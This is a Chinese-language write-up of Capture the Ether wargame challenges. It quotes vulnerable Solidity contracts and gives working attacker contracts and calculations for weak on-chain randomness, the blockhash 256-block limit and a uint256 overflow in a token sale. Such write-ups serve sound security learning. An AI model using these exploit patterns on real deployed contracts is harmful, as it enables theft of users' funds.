---
title: "capture the ether wp"
date: 2021-02-23
update: 2021-02-23
categories: "blockchain"
tags: "blockchain"
publish: true
---

## Lotteries



### Guess the new number



```solidity
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```



```solidity
contract GuessTheNewNumberSolver {
    address owner;

    function GuessTheNewNumberSolver() public {
        owner = msg.sender;
    }

    function guess(address _challenge)
    public
    payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(_challenge);
        challenge.guess.value(msg.value)(answer);
    }

    function ()
    public
    payable {
        
    }
    
    
    function withdraw()
    public
    payable {
    	require(msg.sender == owner);
    	owner.transfer(address(this).balance);
    }
```

使用合约之间调用的方式可以保证二者所在的区块相同，这样就可以获知block number 和now的值

由于最后会把两个eth传给合约，可以在最后加个withdraw函数，把钱拿回来，虽然是免费的，但是不要白不要，如果没这个函数的话这两个eth就拿不回来了。

### Predict the future

源码

```solidity
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

也就是先猜一个，然后再另外一个函数里面给你生成随机数。那么上题的办法就不管用了。但是好在总共也就10种。

实际的解法跟上题差不多，也是使用一个中继合约，只有当区块符合一定规律时才调用PredictTheFutureChallenge的settle函数。

```solidity
contract PredictTheFutureSolver {
    address owner;
	uint8 guessNumber;
    function PredictTheFutureSolver() public {
        owner = msg.sender;
    }

    function lockInGuess(address _challenge, uint8 n)
    public
    payable {
        require(msg.value == 1 ether);

        PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_challenge);
        challenge.lockInGuess.value(msg.value)(n);
        guessNumber = n;
    }

    function settle(address _challenge)
    public
    payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        if (answer == guessNumber) {
            PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_challenge);
            challenge.settle();
        }
    }

    function ()
    public
    payable {
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
```

先猜一个数，调用lockInGuess函数，然后一直调用settle就行了。需要注意的是最好调高点小费，否则很可能会失败。另外呢，虽然说是百分之十的概率，但我是老倒霉蛋了，每次都试了有十几遍才能成功一回。

### Predict the block hash

```solidity
pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

形式与上题几乎相同，但是这次是预测区块哈希值。乍一看是根本不可能的，但是查看`solidity`文档发现

> - `block.blockhash(uint blockNumber) returns (bytes32)`: hash of the given block - only works for 256 most recent, excluding current, blocks - deprecated in version 0.4.22 and replaced by `blockhash(uint blockNumber)`.

仅仅能够计算最近的256个区块的值，对于其他的都返回0。那么只要足够耐心，保证lock跟settle相差超过256个区块就可以了。

这里可以在etherscan网站上把lock对应的区块的值加上256，网站就可以显示出所剩余的时间。

## Math

涉及到一点数学。

### Token sale

源码

```solidity
pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```

注意到这一行

`require(msg.value == numTokens * PRICE_PER_TOKEN);`

存在溢出的可能。这里PRICE_PER_TOKEN等于1 ether即`1,000,000,000,000,000,000`

找到uint256所能表示的最大数，即2^256 - 1

115792089237316195423570985008687907853269984665640564039457584007913129639935

除以1 ether对应的值，得到了

115792089237316195423570985008687907853269984665640564039457

再加个1

115792089237316195423570985008687907853269984665640564039458

这就是我们构造出来的一个整数

msg.value就等于1 ether - 584007913129639935等于

415,992,086,870,360,064

这个就是我们要附加的wei数目，大概是0.4个eth, 再调用一次sell函数就成功了。

